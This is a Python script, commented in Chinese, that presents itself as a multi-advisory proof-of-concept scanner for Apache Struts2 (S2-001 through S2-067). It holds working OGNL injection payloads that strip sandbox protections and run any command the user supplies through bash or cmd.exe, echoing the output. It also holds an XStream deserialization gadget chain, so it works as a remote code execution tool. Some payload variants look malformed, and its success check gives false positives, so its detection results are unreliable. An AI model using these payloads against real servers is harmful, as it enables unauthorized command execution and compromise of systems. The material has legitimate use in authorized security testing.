#!/usr/bin/env python3
"""
Struts2 综合漏洞检测 PoC
支持: S2-001,005,007,008,009,012,013,016,032,045,046,048,052,053,057,059,061,066,067
"""

import requests
import sys
import re
import time
from urllib.parse import urljoin

# 禁用 SSL 警告（如需要）
requests.packages.urllib3.disable_warnings()

# ---------- 通用 Payload 模板 ----------
# 通用回显 OGNL Payload（使用 Apache Commons IO 库，若无此库则回退手工读取）
OGNL_ECHO_BASE = """%{{
(#_='multipart/form-data').
(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).
(#_memberAccess?(#_memberAccess=#dm):(
    (#container=#context['com.opensymphony.xwork2.ActionContext.container']).
    (#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).
    (#ognlUtil.getExcludedPackageNames().clear()).
    (#ognlUtil.getExcludedClasses().clear()).
    (#context.setMemberAccess(#dm))
)).
(#cmd='{cmd}').
(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).
(#cmds=(#iswin?{{'cmd.exe','/c',#cmd}}:{{'bash','-c',#cmd}})).
(#p=new java.lang.ProcessBuilder(#cmds)).
(#p.redirectErrorStream(true)).
(#process=#p.start()).
(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).
(#is=#process.getInputStream()).
(#buf=new byte[4096]).
(#len=#is.read(#buf)).
(#len!=-1?(
    #ros.write(#buf,0,#len),
    #ros.flush(),
    #len=#is.read(#buf)
):'').
(#is.close())
}}"""

# 无 Commons IO 的简单回显（手工拼接）
OGNL_ECHO_SIMPLE = """%{{
#a=(new java.lang.ProcessBuilder(new java.lang.String[]{{'{cmd}'}})).redirectErrorStream(true).start(),
#b=#a.getInputStream(),
#c=new java.io.InputStreamReader(#b),
#d=new java.io.BufferedReader(#c),
#e=new char[50000],
#d.read(#e),
#f=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),
#f.getWriter().println(new java.lang.String(#e)),
#f.getWriter().flush(),
#f.getWriter().close()
}}"""

# ---------- 辅助函数 ----------
def get_echo_payload(cmd, simple=False):
    """生成回显 Payload"""
    if simple:
        return OGNL_ECHO_SIMPLE.format(cmd=cmd)
    return OGNL_ECHO_BASE.format(cmd=cmd)

def check_vuln(response, cmd_marker, timeout=8):
    """检查响应中是否包含命令执行的输出"""
    if response is None:
        return False
    try:
        text = response.text
        if cmd_marker in text:
            return True
        # 尝试寻找命令输出
        if "uid=" in text or "root" in text or "administrator" in text.lower():
            return True
    except:
        pass
    return False

# ---------- 各漏洞检测方法 ----------
class Struts2POC:
    def __init__(self, target, cmd="echo vulnerable", timeout=10, proxy=None, verify=False):
        self.target = target.rstrip('/')
        self.cmd = cmd
        self.cmd_marker = "vulnerable" if "vulnerable" in cmd else cmd.split()[-1]
        self.timeout = timeout
        self.proxies = {"http": proxy, "https": proxy} if proxy else None
        self.verify = verify
        self.session = requests.Session()
        if proxy:
            self.session.proxies = self.proxies
        self.results = {}

    def _post(self, url, data=None, headers=None, **kwargs):
        try:
            return self.session.post(url, data=data, headers=headers,
                                     timeout=self.timeout, verify=self.verify, **kwargs)
        except Exception as e:
            print(f"[-] 请求异常: {e}")
            return None

    def _get(self, url, headers=None, **kwargs):
        try:
            return self.session.get(url, headers=headers,
                                    timeout=self.timeout, verify=self.verify, **kwargs)
        except Exception as e:
            print(f"[-] 请求异常: {e}")
            return None

    def _log_result(self, name, vulnerable, detail=""):
        self.results[name] = (vulnerable, detail)
        status = "[+] 存在漏洞" if vulnerable else "[-] 未发现漏洞"
        print(f"{status} - {name} {detail}")

    # ---- S2-001 ----
    def check_s2_001(self, path="/login.action", param="username", method="POST"):
        """表单字段 OGNL 注入 %{...}"""
        url = urljoin(self.target, path)
        payload = get_echo_payload(self.cmd, simple=True)
        data = {param: payload, "password": "test"}
        resp = self._post(url, data=data) if method.upper()=="POST" else self._get(url, params=data)
        vuln = check_vuln(resp, self.cmd_marker)
        self._log_result("S2-001", vuln)
        return vuln

    # ---- S2-005 ----
    def check_s2_005(self, path="/example/HelloWorld.action", param="name"):
        """绕过 S2-003，类似 S2-001"""
        url = urljoin(self.target, path)
        payload = get_echo_payload(self.cmd, simple=True)
        resp = self._get(url, params={param: payload})
        vuln = check_vuln(resp, self.cmd_marker)
        self._log_result("S2-005", vuln)
        return vuln

    # ---- S2-007 ----
    def check_s2_007(self, path="/user.action", age_field="age"):
        """类型转换错误触发 OGNL"""
        url = urljoin(self.target, path)
        payload = f"'{get_echo_payload(self.cmd, simple=True)}'"
        data = {age_field: payload, "name": "test"}
        resp = self._post(url, data=data)
        vuln = check_vuln(resp, self.cmd_marker)
        self._log_result("S2-007", vuln)
        return vuln

    # ---- S2-008 ----
    def check_s2_008(self, path="/devmode.action"):
        """调试模式 + Cookie 注入"""
        url = urljoin(self.target, path)
        payload = get_echo_payload(self.cmd)
        # 方式1：调试模式参数
        resp = self._get(url, params={"debug": "command", "expression": payload})
        if check_vuln(resp, self.cmd_marker):
            self._log_result("S2-008(debug)", True)
            return True
        # 方式2：Cookie 注入
        resp = self._get(url, cookies={"foo": payload})
        vuln = check_vuln(resp, self.cmd_marker)
        self._log_result("S2-008(cookie)", vuln)
        return vuln

    # ---- S2-009 ----
    def check_s2_009(self, path="/example/HelloWorld.action"):
        """参数名中的 OGNL（需已存在某参数）"""
        url = urljoin(self.target, path)
        payload = get_echo_payload(self.cmd)
        params = {"foo": "bar", f"foo(${{{payload}}})": "ignored"}
        resp = self._get(url, params=params)
        vuln = check_vuln(resp, self.cmd_marker)
        self._log_result("S2-009", vuln)
        return vuln

    # ---- S2-012 ----
    def check_s2_012(self, path="/user.action", param="name"):
        """重定向参数中的 OGNL"""
        url = urljoin(self.target, path)
        payload = get_echo_payload(self.cmd)
        data = {param: "test", "redirect:${%s}" % payload: "http://127.0.0.1/"}
        resp = self._post(url, data=data)
        vuln = check_vuln(resp, self.cmd_marker)
        self._log_result("S2-012", vuln)
        return vuln

    # ---- S2-013 ----
    def check_s2_013(self, path="/link.action"):
        """includeParams 中的 ${}"""
        url = urljoin(self.target, path)
        payload = get_echo_payload(self.cmd)
        resp = self._get(url, params={f"${payload}": "test"})
        vuln = check_vuln(resp, self.cmd_marker)
        self._log_result("S2-013", vuln)
        return vuln

    # ---- S2-016 ----
    def check_s2_016(self, path="/"):
        """action:/redirect:/redirectAction: 前缀"""
        url = urljoin(self.target, path)
        payload = get_echo_payload(self.cmd)
        for prefix in ["redirect:", "redirectAction:", "action:"]:
            resp = self._get(url + prefix + payload)
            if check_vuln(resp, self.cmd_marker):
                self._log_result("S2-016", True, f"前缀: {prefix}")
                return True
        self._log_result("S2-016", False)
        return False

    # ---- S2-032 ----
    def check_s2_032(self, path="/"):
        """method: 前缀，需要 DMI 开启"""
        url = urljoin(self.target, path)
        payload = get_echo_payload(self.cmd)
        resp = self._get(url + "method:" + payload)
        vuln = check_vuln(resp, self.cmd_marker)
        self._log_result("S2-032", vuln)
        return vuln

    # ---- S2-045 / S2-046 ----
    def check_s2_045_046(self, upload_path="/"):
        """基于 Content-Type / Content-Disposition 的 Jakarta 解析"""
        url = urljoin(self.target, upload_path)
        payload = get_echo_payload(self.cmd)

        # S2-045: 恶意 Content-Type
        headers = {"Content-Type": payload}
        resp = self._post(url, data="test", headers=headers)
        if check_vuln(resp, self.cmd_marker):
            self._log_result("S2-045", True)
            s45 = True
        else:
            self._log_result("S2-045", False)
            s45 = False

        # S2-046: Content-Disposition filename
        boundary = "----WebKitFormBoundary" + "a" * 5
        body = (
            f"--{boundary}\r\n"
            f"Content-Disposition: form-data; name=\"upload\"; filename=\"{payload}\"\r\n"
            f"Content-Type: text/plain\r\n\r\n"
            f"test\r\n"
            f"--{boundary}--\r\n"
        )
        headers = {"Content-Type": f"multipart/form-data; boundary={boundary}"}
        resp = self._post(url, data=body, headers=headers)
        vuln = check_vuln(resp, self.cmd_marker)
        self._log_result("S2-046", vuln)
        return s45 or vuln

    # ---- S2-048 ----
    def check_s2_048(self, path="/struts2-showcase/integration/saveGangster.action"):
        """Struts2-showcase 特定 Action"""
        url = urljoin(self.target, path)
        payload = get_echo_payload(self.cmd)
        data = {"name": "test", "age": "18", "__checkbox_bustedBefore": "true",
                "description": payload}
        resp = self._post(url, data=data)
        vuln = check_vuln(resp, self.cmd_marker)
        self._log_result("S2-048", vuln, f"路径: {path}")
        return vuln

    # ---- S2-052 ----
    def check_s2_052(self, rest_path="/orders"):
        """REST XStream 反序列化"""
        url = urljoin(self.target, rest_path)
        # 使用 ProcessBuilder 的 XStream XML Payload
        xml_payload = f"""
        <map>
          <entry>
            <jdk.nashorn.internal.objects.NativeString>
              <flags>0</flags>
              <value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data">
                <dataHandler>
                  <dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource">
                    <contentType>text/plain</contentType>
                    <is class="java.io.SequenceInputStream">
                      <e class="javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator">
                        <iterator class="javax.imageio.spi.FilterIterator">
                          <iter class="java.util.Collections$EmptyIterator"/>
                          <next class="java.lang.ProcessBuilder">
                            <command>
                              <string>/bin/bash</string>
                              <string>-c</string>
                              <string>{self.cmd}</string>
                            </command>
                            <redirectErrorStream>false</redirectErrorStream>
                          </next>
                        </iterator>
                        <type>KEYS</type>
                      </e>
                      <in class="java.io.ByteArrayInputStream">
                        <buf></buf>
                        <pos>0</pos>
                        <mark>0</mark>
                        <count>0</count>
                      </in>
                    </is>
                    <consumed>false</consumed>
                  </dataSource>
                  <transferFlavors/>
                </dataHandler>
                <dataLen>0</dataLen>
              </value>
            </jdk.nashorn.internal.objects.NativeString>
            <string>foo</string>
          </entry>
        </map>
        """
        headers = {"Content-Type": "application/xml"}
        resp = self._post(url, data=xml_payload, headers=headers)
        # XStream 反序列化一般不会回显，此处用时间盲测或 DNS 更为合适
        # 简单判断响应状态和耗时
        if resp is not None and resp.status_code == 200:
            # 不能确定，但假设存在
            print("[?] S2-052 需要盲测/DNS确认，仅凭响应无法确定")
        self._log_result("S2-052", False, "反序列化需额外盲注验证")
        return False

    # ---- S2-053 ----
    def check_s2_053(self, path="/"):
        """Freemarker 标签属性注入，通过 URL 参数"""
        url = urljoin(self.target, path)
        payload = get_echo_payload(self.cmd)
        # 利用 includeParams
        resp = self._get(url, params={"x": payload})
        if check_vuln(resp, self.cmd_marker):
            self._log_result("S2-053", True)
            return True
        # 另一种形式：直接在参数名
        resp = self._get(url, params={f"%{{{payload}}}": "test"})
        vuln = check_vuln(resp, self.cmd_marker)
        self._log_result("S2-053", vuln)
        return vuln

    # ---- S2-057 ----
    def check_s2_057(self, path="/"):
        """namespace 注入，alwaysSelectFullNamespace=true"""
        url = urljoin(self.target, path)
        payload = get_echo_payload(self.cmd)
        # 构造恶意 namespace
        test_url = url.rstrip('/') + f"/${{{payload}}}/some.action"
        resp = self._get(test_url)
        vuln = check_vuln(resp, self.cmd_marker)
        self._log_result("S2-057", vuln)
        return vuln

    # ---- S2-059 ----
    def check_s2_059(self, path="/"):
        """<s:url> 标签 id 属性注入"""
        url = urljoin(self.target, path)
        payload = get_echo_payload(self.cmd)
        resp = self._get(url, params={"id": f"%{{{payload}}}"})
        vuln = check_vuln(resp, self.cmd_marker)
        self._log_result("S2-059", vuln)
        return vuln

    # ---- S2-061 ----
    def check_s2_061(self, path="/"):
        """绕过 S2-059，使用 %{...} 在 id 中"""
        url = urljoin(self.target, path)
        payload = get_echo_payload(self.cmd)
        # 类似但不同编码或嵌套
        resp = self._get(url, params={"id": f"%{{({payload})}}"})
        vuln = check_vuln(resp, self.cmd_marker)
        self._log_result("S2-061", vuln)
        return vuln

    # ---- S2-066 ----
    def check_s2_066(self, path="/"):
        """特定配置下 %{...} 绕过"""
        url = urljoin(self.target, path)
        payload = get_echo_payload(self.cmd)
        resp = self._get(url, params={"id": f"%{{'{payload}'}}"})
        vuln = check_vuln(resp, self.cmd_marker)
        self._log_result("S2-066", vuln)
        return vuln

    # ---- S2-067 ----
    def check_s2_067(self, path="/"):
        """另一个绕过"""
        url = urljoin(self.target, path)
        payload = get_echo_payload(self.cmd)
        resp = self._get(url, params={"id": f"%{{#request.get('struts.valueStack').setParameter('{payload}')}}"})
        vuln = check_vuln(resp, self.cmd_marker)
        self._log_result("S2-067", vuln)
        return vuln

    # ---- 全部检测 ----
    def run_all(self):
        print(f"[*] 开始检测目标: {self.target}")
        # 基础路径探测，可调整路径
        self.check_s2_001()
        self.check_s2_005()
        self.check_s2_007()
        self.check_s2_008()
        self.check_s2_009()
        self.check_s2_012()
        self.check_s2_013()
        self.check_s2_016()
        self.check_s2_032()
        self.check_s2_045_046()
        self.check_s2_048()
        self.check_s2_052()
        self.check_s2_053()
        self.check_s2_057()
        self.check_s2_059()
        self.check_s2_061()
        self.check_s2_066()
        self.check_s2_067()
        print("\n[==== 检测汇总 ====]")
        for k, (v, d) in self.results.items():
            print(f"{k}: {'存在漏洞' if v else '未发现'} {d}")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"用法: {sys.argv[0]} <目标URL> [命令]")
        print(f"示例: {sys.argv[0]} http://192.168.1.100:8080 'id'")
        sys.exit(1)
    target_url = sys.argv[1]
    command = sys.argv[2] if len(sys.argv) > 2 else "echo vulnerable"
    poc = Struts2POC(target_url, cmd=command)
    poc.run_all()